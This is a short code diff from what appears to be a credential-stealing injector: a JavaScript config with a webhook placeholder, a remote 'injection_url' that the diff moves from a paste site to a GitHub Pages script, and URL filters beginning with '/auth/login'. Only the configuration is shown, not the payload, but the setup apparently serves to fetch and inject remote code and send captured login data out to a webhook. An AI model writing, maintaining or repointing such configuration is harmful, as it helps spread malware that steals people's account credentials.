@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://0x0.st/XgmP.js",
+    injection_url: "https://askedinop.github.io/cerberino.github.io/index.js",
     filters: {
         urls: [
             '/auth/login',
